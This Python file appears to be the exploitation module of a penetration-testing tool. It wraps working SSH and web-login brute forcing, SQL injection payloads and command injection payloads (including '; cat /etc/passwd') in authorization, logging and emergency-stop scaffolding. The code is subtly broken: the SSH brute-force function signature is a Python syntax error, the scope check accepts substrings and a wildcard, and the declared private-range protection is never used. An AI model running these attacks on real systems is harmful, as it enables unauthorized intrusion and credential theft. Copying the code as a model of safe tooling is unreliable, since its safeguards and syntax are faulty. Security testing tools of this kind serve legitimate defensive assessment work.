"""
Exploitation Module for Aetherveil Sentinel

Ethical exploitation and penetration testing capabilities for defensive security
operations. All exploitation techniques are designed for authorized testing only
and include comprehensive safety measures.

Security Level: DEFENSIVE_ONLY - AUTHORIZED_TESTING_ONLY
"""

import asyncio
import base64
import hashlib
import json
import logging
import os
import socket
import subprocess
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from typing import Dict, List, Any, Optional, Tuple, Callable
import tempfile
import uuid

import paramiko
import requests
from scapy.all import *

from ..config.config import AetherVeilConfig
from . import ModuleType, ModuleStatus, register_module

logger = logging.getLogger(__name__)

# SECURITY DISCLAIMER AND ETHICS ENFORCEMENT
EXPLOITATION_DISCLAIMER = """
CRITICAL SECURITY NOTICE:
This exploitation module is designed EXCLUSIVELY for authorized penetration testing
and defensive security assessments. Use of these capabilities against systems
without explicit written authorization is ILLEGAL and UNETHICAL.

Users MUST:
1. Obtain written authorization before using any exploitation techniques
2. Comply with all applicable laws and regulations
3. Use only for defensive security purposes
4. Implement proper safeguards and logging
5. Follow responsible disclosure practices

UNAUTHORIZED USE IS STRICTLY PROHIBITED AND MAY RESULT IN LEGAL CONSEQUENCES.
"""

class ExploitationType(Enum):
    """Types of exploitation techniques"""
    CREDENTIAL_ATTACK = "credential_attack"
    BUFFER_OVERFLOW = "buffer_overflow"
    INJECTION_ATTACK = "injection_attack"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    NETWORK_ATTACK = "network_attack"
    WEB_EXPLOIT = "web_exploit"
    SOCIAL_ENGINEERING = "social_engineering"
    PHYSICAL_ACCESS = "physical_access"

class ExploitSeverity(Enum):
    """Severity levels for exploitation attempts"""
    LOW_IMPACT = "low_impact"
    MEDIUM_IMPACT = "medium_impact"
    HIGH_IMPACT = "high_impact"
    CRITICAL_IMPACT = "critical_impact"

class ExploitStatus(Enum):
    """Status of exploitation attempts"""
    NOT_ATTEMPTED = "not_attempted"
    IN_PROGRESS = "in_progress"
    SUCCESSFUL = "successful"
    FAILED = "failed"
    BLOCKED = "blocked"
    UNAUTHORIZED = "unauthorized"

@dataclass
class AuthorizationContext:
    """Authorization context for exploitation activities"""
    target_scope: List[str]
    authorized_by: str
    authorization_id: str
    start_time: datetime
    end_time: datetime
    restrictions: List[str] = field(default_factory=list)
    contact_info: str = ""
    emergency_stop_code: str = ""

@dataclass
class ExploitTarget:
    """Target specification for exploitation"""
    target: str
    target_type: str
    vulnerability_id: str
    exploitation_type: ExploitationType
    severity: ExploitSeverity
    authorization: AuthorizationContext
    options: Dict[str, Any] = field(default_factory=dict)
    safety_checks: bool = True

@dataclass
class ExploitResult:
    """Result of exploitation attempt"""
    target: str
    exploitation_type: ExploitationType
    timestamp: datetime
    status: ExploitStatus
    success: bool
    evidence: Dict[str, Any]
    impact_assessment: str
    remediation_steps: List[str]
    duration: timedelta
    authorization_id: str
    metadata: Dict[str, Any] = field(default_factory=dict)

class AuthorizationManager:
    """Manages authorization and ethical compliance"""
    
    def __init__(self):
        self.active_authorizations: Dict[str, AuthorizationContext] = {}
        self.audit_log: List[Dict[str, Any]] = []
        
    def validate_authorization(self, target: str, auth_context: AuthorizationContext) -> bool:
        """Validate authorization for target"""
        try:
            # Check if current time is within authorized window
            current_time = datetime.utcnow()
            if not (auth_context.start_time <= current_time <= auth_context.end_time):
                logger.error(f"Authorization window expired for {target}")
                return False
            
            # Check if target is within authorized scope
            target_authorized = False
            for scope in auth_context.target_scope:
                if target in scope or scope == "*":
                    target_authorized = True
                    break
                    
            if not target_authorized:
                logger.error(f"Target {target} not in authorized scope")
                return False
            
            # Log authorization check
            self.audit_log.append({
                "timestamp": current_time.isoformat(),
                "action": "authorization_check",
                "target": target,
                "authorization_id": auth_context.authorization_id,
                "result": "approved"
            })
            
            return True
            
        except Exception as e:
            logger.error(f"Authorization validation failed: {e}")
            return False
    
    def emergency_stop(self, stop_code: str, authorization_id: str) -> bool:
        """Emergency stop mechanism"""
        try:
            auth_context = self.active_authorizations.get(authorization_id)
            if auth_context and auth_context.emergency_stop_code == stop_code:
                # Immediately invalidate authorization
                auth_context.end_time = datetime.utcnow()
                
                self.audit_log.append({
                    "timestamp": datetime.utcnow().isoformat(),
                    "action": "emergency_stop",
                    "authorization_id": authorization_id,
                    "initiated_by": "emergency_code"
                })
                
                logger.critical(f"Emergency stop activated for authorization {authorization_id}")
                return True
                
        except Exception as e:
            logger.error(f"Emergency stop failed: {e}")
            
        return False
    
    def log_exploitation_attempt(self, target: str, exploit_type: ExploitationType, 
                                authorization_id: str, result: str) -> None:
        """Log exploitation attempt for audit purposes"""
        self.audit_log.append({
            "timestamp": datetime.utcnow().isoformat(),
            "action": "exploitation_attempt",
            "target": target,
            "exploit_type": exploit_type.value,
            "authorization_id": authorization_id,
            "result": result
        })

class SafetyMechanisms:
    """Safety mechanisms to prevent accidental damage"""
    
    @staticmethod
    def validate_target_safety(target: str, exploit_type: ExploitationType) -> Tuple[bool, str]:
        """Validate that target is safe for exploitation"""
        
        # Critical infrastructure protection
        critical_ranges = [
            "10.0.0.0/8",    # Private networks that might be critical
            "172.16.0.0/12", # Private networks
            "192.168.0.0/16" # Private networks
        ]
        
        critical_domains = [
            "gov", "mil", "edu", "hospital", "bank", "finance",
            "power", "energy", "water", "transport"
        ]
        
        # Check for critical infrastructure indicators
        for domain in critical_domains:
            if domain in target.lower():
                return False, f"Target appears to be critical infrastructure: {domain}"
        
        # Check for high-impact exploitation types on production-like targets
        if exploit_type in [ExploitationType.BUFFER_OVERFLOW, ExploitationType.PRIVILEGE_ESCALATION]:
            if "prod" in target.lower() or "production" in target.lower():
                return False, "High-impact exploitation not allowed on production systems"
        
        return True, "Target validation passed"
    
    @staticmethod
    def create_safety_backup(target: str) -> Optional[str]:
        """Create safety backup before exploitation"""
        try:
            # For file-based exploits, create backup
            if os.path.isfile(target):
                backup_path = f"{target}.aetherveil_backup_{int(time.time())}"
                subprocess.run(["cp", target, backup_path], check=True)
                return backup_path
        except Exception as e:
            logger.error(f"Failed to create safety backup: {e}")
        
        return None
    
    @staticmethod
    def rollback_changes(backup_path: str, original_path: str) -> bool:
        """Rollback changes using safety backup"""
        try:
            if backup_path and os.path.exists(backup_path):
                subprocess.run(["cp", backup_path, original_path], check=True)
                os.remove(backup_path)
                return True
        except Exception as e:
            logger.error(f"Rollback failed: {e}")
        
        return False

class CredentialAttacks:
    """Credential-based attack techniques"""
    
    def __init__(self):
        self.common_passwords = [
            "admin", "password", "123456", "password123", "admin123",
            "root", "toor", "guest", "user", "test", "demo"
        ]
        self.common_usernames = [
            "admin", "administrator", "root", "user", "guest", "test",
            "demo", "operator", "manager", "service"
        ]
    
    async def brute_force_ssh(self, target: str, port: int = 22, 
                             authorization: AuthorizationContext) -> ExploitResult:
        """Ethical SSH brute force attack"""
        start_time = datetime.utcnow()
        evidence = {"attempts": [], "successful_credentials": None}
        
        try:
            # Safety check
            is_safe, safety_msg = SafetyMechanisms.validate_target_safety(target, ExploitationType.CREDENTIAL_ATTACK)
            if not is_safe:
                return ExploitResult(
                    target=target,
                    exploitation_type=ExploitationType.CREDENTIAL_ATTACK,
                    timestamp=start_time,
                    status=ExploitStatus.BLOCKED,
                    success=False,
                    evidence={"safety_block": safety_msg},
                    impact_assessment="No impact - blocked by safety mechanisms",
                    remediation_steps=["Safety validation failed"],
                    duration=datetime.utcnow() - start_time,
                    authorization_id=authorization.authorization_id
                )
            
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Limited brute force to prevent system lockout
            max_attempts = 5
            attempt_count = 0
            
            for username in self.common_usernames[:3]:  # Limit usernames
                if attempt_count >= max_attempts:
                    break
                    
                for password in self.common_passwords[:3]:  # Limit passwords
                    if attempt_count >= max_attempts:
                        break
                        
                    try:
                        client.connect(
                            hostname=target,
                            port=port,
                            username=username,
                            password=password,
                            timeout=5,
                            auth_timeout=5
                        )
                        
                        # Successful login
                        evidence["successful_credentials"] = {"username": username, "password": password}
                        evidence["attempts"].append({
                            "username": username,
                            "password": password,
                            "result": "success"
                        })
                        
                        client.close()
                        
                        return ExploitResult(
                            target=target,
                            exploitation_type=ExploitationType.CREDENTIAL_ATTACK,
                            timestamp=start_time,
                            status=ExploitStatus.SUCCESSFUL,
                            success=True,
                            evidence=evidence,
                            impact_assessment="High - Default credentials allow full system access",
                            remediation_steps=[
                                "Change default credentials immediately",
                                "Implement strong password policy",
                                "Enable account lockout mechanisms",
                                "Consider multi-factor authentication"
                            ],
                            duration=datetime.utcnow() - start_time,
                            authorization_id=authorization.authorization_id
                        )
                        
                    except paramiko.AuthenticationException:
                        evidence["attempts"].append({
                            "username": username,
                            "password": password,
                            "result": "failed"
                        })
                        attempt_count += 1
                        
                    except Exception as e:
                        logger.debug(f"SSH connection error: {e}")
                        
                    # Rate limiting to prevent account lockout
                    await asyncio.sleep(1)
            
            client.close()
            
        except Exception as e:
            logger.error(f"SSH brute force failed: {e}")
            
        return ExploitResult(
            target=target,
            exploitation_type=ExploitationType.CREDENTIAL_ATTACK,
            timestamp=start_time,
            status=ExploitStatus.FAILED,
            success=False,
            evidence=evidence,
            impact_assessment="No impact - credentials not compromised",
            remediation_steps=["Review and strengthen authentication mechanisms"],
            duration=datetime.utcnow() - start_time,
            authorization_id=authorization.authorization_id
        )
    
    async def http_form_brute_force(self, target: str, form_data: Dict[str, str],
                                   authorization: AuthorizationContext) -> ExploitResult:
        """HTTP form brute force attack"""
        start_time = datetime.utcnow()
        evidence = {"attempts": [], "successful_credentials": None}
        
        try:
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'AetherVeil-ExploitModule/1.0'
            })
            
            # Limited attempts to prevent account lockout
            max_attempts = 5
            attempt_count = 0
            
            for username in self.common_usernames[:3]:
                if attempt_count >= max_attempts:
                    break
                    
                for password in self.common_passwords[:3]:
                    if attempt_count >= max_attempts:
                        break
                        
                    try:
                        # Prepare form data
                        login_data = form_data.copy()
                        login_data.update({
                            "username": username,
                            "password": password
                        })
                        
                        response = session.post(target, data=login_data, timeout=10)
                        
                        # Check for successful login indicators
                        success_indicators = ["welcome", "dashboard", "profile", "logout", "success"]
                        failure_indicators = ["invalid", "error", "failed", "incorrect"]
                        
                        if any(indicator in response.text.lower() for indicator in success_indicators):
                            if not any(indicator in response.text.lower() for indicator in failure_indicators):
                                evidence["successful_credentials"] = {"username": username, "password": password}
                                evidence["attempts"].append({
                                    "username": username,
                                    "password": password,
                                    "result": "success",
                                    "response_code": response.status_code
                                })
                                
                                return ExploitResult(
                                    target=target,
                                    exploitation_type=ExploitationType.CREDENTIAL_ATTACK,
                                    timestamp=start_time,
                                    status=ExploitStatus.SUCCESSFUL,
                                    success=True,
                                    evidence=evidence,
                                    impact_assessment="High - Web application access compromised",
                                    remediation_steps=[
                                        "Change default credentials",
                                        "Implement account lockout",
                                        "Add CAPTCHA protection",
                                        "Enable multi-factor authentication"
                                    ],
                                    duration=datetime.utcnow() - start_time,
                                    authorization_id=authorization.authorization_id
                                )
                        
                        evidence["attempts"].append({
                            "username": username,
                            "password": password,
                            "result": "failed",
                            "response_code": response.status_code
                        })
                        attempt_count += 1
                        
                    except Exception as e:
                        logger.debug(f"HTTP form attack error: {e}")
                        
                    # Rate limiting
                    await asyncio.sleep(2)
                    
        except Exception as e:
            logger.error(f"HTTP form brute force failed: {e}")
            
        return ExploitResult(
            target=target,
            exploitation_type=ExploitationType.CREDENTIAL_ATTACK,
            timestamp=start_time,
            status=ExploitStatus.FAILED,
            success=False,
            evidence=evidence,
            impact_assessment="No impact - credentials not compromised",
            remediation_steps=["Implement stronger authentication controls"],
            duration=datetime.utcnow() - start_time,
            authorization_id=authorization.authorization_id
        )

class InjectionAttacks:
    """Injection-based attack techniques"""
    
    async def sql_injection_test(self, target: str, parameters: Dict[str, str],
                                authorization: AuthorizationContext) -> ExploitResult:
        """SQL injection testing"""
        start_time = datetime.utcnow()
        evidence = {"payloads_tested": [], "successful_payloads": []}
        
        # Safe SQL injection payloads for testing
        sql_payloads = [
            "'",
            "1' OR '1'='1",
            "1' OR '1'='1' --",
            "' OR 1=1--",
            "1' UNION SELECT 1,version(),3--",
            "' OR 'a'='a",
            "1' AND (SELECT COUNT(*) FROM sysobjects) > 0--"
        ]
        
        try:
            session = requests.Session()
            
            for param_name, param_value in parameters.items():
                for payload in sql_payloads:
                    try:
                        # Test payload in parameter
                        test_params = parameters.copy()
                        test_params[param_name] = payload
                        
                        response = session.get(target, params=test_params, timeout=10)
                        
                        evidence["payloads_tested"].append({
                            "parameter": param_name,
                            "payload": payload,
                            "response_code": response.status_code,
                            "response_length": len(response.text)
                        })
                        
                        # Check for SQL error indicators
                        sql_errors = [
                            "sql syntax", "mysql", "postgresql", "oracle", "sqlite",
                            "syntax error", "quoted string", "unterminated", "database"
                        ]
                        
                        if any(error in response.text.lower() for error in sql_errors):
                            evidence["successful_payloads"].append({
                                "parameter": param_name,
                                "payload": payload,
                                "evidence": "SQL error messages detected"
                            })
                            
                        # Rate limiting
                        await asyncio.sleep(0.5)
                        
                    except Exception as e:
                        logger.debug(f"SQL injection test error: {e}")
                        
        except Exception as e:
            logger.error(f"SQL injection test failed: {e}")
            
        success = len(evidence["successful_payloads"]) > 0
        
        return ExploitResult(
            target=target,
            exploitation_type=ExploitationType.INJECTION_ATTACK,
            timestamp=start_time,
            status=ExploitStatus.SUCCESSFUL if success else ExploitStatus.FAILED,
            success=success,
            evidence=evidence,
            impact_assessment="High - Database access may be compromised" if success else "No impact detected",
            remediation_steps=[
                "Use parameterized queries",
                "Implement input validation",
                "Apply least privilege principles",
                "Enable database security logging"
            ] if success else ["Continue monitoring for injection attempts"],
            duration=datetime.utcnow() - start_time,
            authorization_id=authorization.authorization_id
        )
    
    async def command_injection_test(self, target: str, parameters: Dict[str, str],
                                   authorization: AuthorizationContext) -> ExploitResult:
        """Command injection testing"""
        start_time = datetime.utcnow()
        evidence = {"payloads_tested": [], "successful_payloads": []}
        
        # Safe command injection payloads
        cmd_payloads = [
            "; ls",
            "| whoami",
            "&& id",
            "; cat /etc/passwd",
            "| ping -c 1 127.0.0.1",
            "&& echo 'command_injection_test'"
        ]
        
        try:
            session = requests.Session()
            
            for param_name, param_value in parameters.items():
                for payload in cmd_payloads:
                    try:
                        # Test payload
                        test_params = parameters.copy()
                        test_params[param_name] = param_value + payload
                        
                        response = session.get(target, params=test_params, timeout=10)
                        
                        evidence["payloads_tested"].append({
                            "parameter": param_name,
                            "payload": payload,
                            "response_code": response.status_code
                        })
                        
                        # Check for command execution indicators
                        cmd_indicators = [
                            "root:", "uid=", "gid=", "groups=",
                            "PING", "packet", "transmitted"
                        ]
                        
                        if any(indicator in response.text for indicator in cmd_indicators):
                            evidence["successful_payloads"].append({
                                "parameter": param_name,
                                "payload": payload,
                                "evidence": "Command execution indicators detected"
                            })
                            
                        await asyncio.sleep(0.5)
                        
                    except Exception as e:
                        logger.debug(f"Command injection test error: {e}")
                        
        except Exception as e:
            logger.error(f"Command injection test failed: {e}")
            
        success = len(evidence["successful_payloads"]) > 0
        
        return ExploitResult(
            target=target,
            exploitation_type=ExploitationType.INJECTION_ATTACK,
            timestamp=start_time,
            status=ExploitStatus.SUCCESSFUL if success else ExploitStatus.FAILED,
            success=success,
            evidence=evidence,
            impact_assessment="Critical - System command execution possible" if success else "No impact detected",
            remediation_steps=[
                "Sanitize all user inputs",
                "Use whitelisting for allowed characters",
                "Implement proper access controls",
                "Run applications with minimal privileges"
            ] if success else ["Continue monitoring for injection attempts"],
            duration=datetime.utcnow() - start_time,
            authorization_id=authorization.authorization_id
        )

class NetworkAttacks:
    """Network-based attack techniques"""
    
    async def arp_spoofing_test(self, target_network: str, authorization: AuthorizationContext) -> ExploitResult:
        """ARP spoofing test (monitoring only)"""
        start_time = datetime.utcnow()
        evidence = {"arp_table_before": [], "spoofing_possible": False}
        
        try:
            # This is a passive test to check if ARP spoofing is possible
            # We DO NOT actually perform ARP spoofing
            
            # Get current ARP table
            arp_result = subprocess.run(["arp", "-a"], capture_output=True, text=True)
            evidence["arp_table_before"] = arp_result.stdout.split('\n')
            
            # Check network configuration for ARP spoofing vulnerability
            # This is detection only, not exploitation
            proc_net = "/proc/net/arp"
            if os.path.exists(proc_net):
                with open(proc_net, 'r') as f:
                    arp_entries = f.readlines()
                    evidence["arp_entries_count"] = len(arp_entries)
                    
                    # If multiple hosts on network, ARP spoofing may be possible
                    if len(arp_entries) > 2:
                        evidence["spoofing_possible"] = True
                        
        except Exception as e:
            logger.error(f"ARP analysis failed: {e}")
            
        return ExploitResult(
            target=target_network,
            exploitation_type=ExploitationType.NETWORK_ATTACK,
            timestamp=start_time,
            status=ExploitStatus.SUCCESSFUL if evidence["spoofing_possible"] else ExploitStatus.FAILED,
            success=evidence["spoofing_possible"],
            evidence=evidence,
            impact_assessment="Medium - Network traffic interception possible" if evidence["spoofing_possible"] else "No vulnerability detected",
            remediation_steps=[
                "Implement ARP monitoring",
                "Use static ARP entries for critical hosts",
                "Deploy network segmentation",
                "Enable port security on switches"
            ] if evidence["spoofing_possible"] else ["Network appears secure against ARP spoofing"],
            duration=datetime.utcnow() - start_time,
            authorization_id=authorization.authorization_id
        )

class ExploitationModule:
    """Main exploitation module orchestrator"""
    
    def __init__(self, config: AetherVeilConfig):
        self.config = config
        self.module_type = ModuleType.EXPLOITATION
        self.status = ModuleStatus.INITIALIZED
        self.version = "1.0.0"
        
        # Initialize components
        self.auth_manager = AuthorizationManager()
        self.credential_attacks = CredentialAttacks()
        self.injection_attacks = InjectionAttacks()
        self.network_attacks = NetworkAttacks()
        
        # Result storage
        self.exploit_results: List[ExploitResult] = []
        
        # Log the security disclaimer
        logger.warning(EXPLOITATION_DISCLAIMER)
        
        logger.info("Exploitation module initialized with ethical safeguards")
        
    async def start(self) -> bool:
        """Start the exploitation module"""
        try:
            self.status = ModuleStatus.RUNNING
            logger.info("Exploitation module started")
            return True
        except Exception as e:
            self.status = ModuleStatus.ERROR
            logger.error(f"Failed to start exploitation module: {e}")
            return False
    
    async def stop(self) -> bool:
        """Stop the exploitation module"""
        try:
            self.status = ModuleStatus.STOPPED
            logger.info("Exploitation module stopped")
            return True
        except Exception as e:
            logger.error(f"Failed to stop exploitation module: {e}")
            return False
    
    async def execute_exploit(self, target: ExploitTarget) -> ExploitResult:
        """Execute exploitation attempt with authorization checks"""
        
        # CRITICAL: Validate authorization first
        if not self.auth_manager.validate_authorization(target.target, target.authorization):
            logger.error(f"UNAUTHORIZED exploitation attempt blocked for {target.target}")
            return ExploitResult(
                target=target.target,
                exploitation_type=target.exploitation_type,
                timestamp=datetime.utcnow(),
                status=ExploitStatus.UNAUTHORIZED,
                success=False,
                evidence={"error": "Authorization validation failed"},
                impact_assessment="No impact - unauthorized attempt blocked",
                remediation_steps=["Verify proper authorization before attempting exploitation"],
                duration=timedelta(0),
                authorization_id=target.authorization.authorization_id
            )
        
        # Log exploitation attempt
        self.auth_manager.log_exploitation_attempt(
            target.target, 
            target.exploitation_type,
            target.authorization.authorization_id,
            "initiated"
        )
        
        try:
            result = None
            
            if target.exploitation_type == ExploitationType.CREDENTIAL_ATTACK:
                if "ssh" in target.options.get("service", "").lower():
                    result = await self.credential_attacks.brute_force_ssh(
                        target.target,
                        target.options.get("port", 22),
                        target.authorization
                    )
                elif "http" in target.options.get("service", "").lower():
                    result = await self.credential_attacks.http_form_brute_force(
                        target.target,
                        target.options.get("form_data", {}),
                        target.authorization
                    )
                    
            elif target.exploitation_type == ExploitationType.INJECTION_ATTACK:
                if target.options.get("injection_type") == "sql":
                    result = await self.injection_attacks.sql_injection_test(
                        target.target,
                        target.options.get("parameters", {}),
                        target.authorization
                    )
                elif target.options.get("injection_type") == "command":
                    result = await self.injection_attacks.command_injection_test(
                        target.target,
                        target.options.get("parameters", {}),
                        target.authorization
                    )
                    
            elif target.exploitation_type == ExploitationType.NETWORK_ATTACK:
                if target.options.get("attack_type") == "arp_spoofing":
                    result = await self.network_attacks.arp_spoofing_test(
                        target.target,
                        target.authorization
                    )
            
            if result is None:
                result = ExploitResult(
                    target=target.target,
                    exploitation_type=target.exploitation_type,
                    timestamp=datetime.utcnow(),
                    status=ExploitStatus.FAILED,
                    success=False,
                    evidence={"error": "Exploitation type not implemented or not supported"},
                    impact_assessment="No impact - exploitation not performed",
                    remediation_steps=["Check exploit configuration"],
                    duration=timedelta(0),
                    authorization_id=target.authorization.authorization_id
                )
            
            # Store result
            self.exploit_results.append(result)
            
            # Log final result
            self.auth_manager.log_exploitation_attempt(
                target.target,
                target.exploitation_type,
                target.authorization.authorization_id,
                "successful" if result.success else "failed"
            )
            
            logger.info(f"Exploitation completed for {target.target}: {result.status.value}")
            
        except Exception as e:
            logger.error(f"Exploitation failed for {target.target}: {e}")
            
            result = ExploitResult(
                target=target.target,
                exploitation_type=target.exploitation_type,
                timestamp=datetime.utcnow(),
                status=ExploitStatus.FAILED,
                success=False,
                evidence={"error": str(e)},
                impact_assessment="No impact - exploitation failed due to error",
                remediation_steps=["Check target configuration and network connectivity"],
                duration=timedelta(0),
                authorization_id=target.authorization.authorization_id
            )
            self.exploit_results.append(result)
            
        return result
    
    def create_authorization_context(self, target_scope: List[str], authorized_by: str,
                                   duration_hours: int = 24) -> AuthorizationContext:
        """Create authorization context for exploitation activities"""
        auth_id = str(uuid.uuid4())
        emergency_code = str(uuid.uuid4())[:8]
        
        start_time = datetime.utcnow()
        end_time = start_time + timedelta(hours=duration_hours)
        
        auth_context = AuthorizationContext(
            target_scope=target_scope,
            authorized_by=authorized_by,
            authorization_id=auth_id,
            start_time=start_time,
            end_time=end_time,
            emergency_stop_code=emergency_code
        )
        
        self.auth_manager.active_authorizations[auth_id] = auth_context
        
        logger.info(f"Authorization created: {auth_id} for {len(target_scope)} targets")
        logger.info(f"Emergency stop code: {emergency_code}")
        
        return auth_context
    
    def emergency_stop(self, stop_code: str, authorization_id: str) -> bool:
        """Emergency stop for exploitation activities"""
        return self.auth_manager.emergency_stop(stop_code, authorization_id)
    
    def get_exploit_results(self, target: str = None, 
                           exploitation_type: ExploitationType = None) -> List[ExploitResult]:
        """Retrieve exploitation results with optional filtering"""
        filtered_results = self.exploit_results
        
        if target:
            filtered_results = [r for r in filtered_results if target in r.target]
            
        if exploitation_type:
            filtered_results = [r for r in filtered_results if r.exploitation_type == exploitation_type]
            
        return filtered_results
    
    def export_results(self, format: str = "json") -> str:
        """Export exploitation results"""
        if format == "json":
            results_dict = []
            for result in self.exploit_results:
                result_dict = {
                    "target": result.target,
                    "exploitation_type": result.exploitation_type.value,
                    "timestamp": result.timestamp.isoformat(),
                    "status": result.status.value,
                    "success": result.success,
                    "evidence": result.evidence,
                    "impact_assessment": result.impact_assessment,
                    "remediation_steps": result.remediation_steps,
                    "duration": result.duration.total_seconds(),
                    "authorization_id": result.authorization_id,
                    "metadata": result.metadata
                }
                results_dict.append(result_dict)
            return json.dumps(results_dict, indent=2)
        
        return ""
    
    def get_audit_log(self) -> List[Dict[str, Any]]:
        """Get audit log of all exploitation activities"""
        return self.auth_manager.audit_log.copy()
    
    async def get_status(self) -> Dict[str, Any]:
        """Get module status and statistics"""
        successful_exploits = len([r for r in self.exploit_results if r.success])
        
        return {
            "module": "exploitation",
            "status": self.status.value,
            "version": self.version,
            "total_attempts": len(self.exploit_results),
            "successful_exploits": successful_exploits,
            "active_authorizations": len(self.auth_manager.active_authorizations),
            "audit_log_entries": len(self.auth_manager.audit_log),
            "last_activity": max([r.timestamp for r in self.exploit_results]).isoformat() if self.exploit_results else None,
            "security_disclaimer": "All exploitation activities are logged and require authorization"
        }

# Register module on import
def create_exploitation_module(config: AetherVeilConfig) -> ExploitationModule:
    """Factory function to create and register exploitation module"""
    module = ExploitationModule(config)
    register_module("exploitation", module)
    return module

__all__ = [
    "ExploitationModule",
    "ExploitTarget",
    "ExploitResult",
    "AuthorizationContext",
    "ExploitationType",
    "ExploitSeverity", 
    "ExploitStatus",
    "create_exploitation_module",
    "EXPLOITATION_DISCLAIMER"
]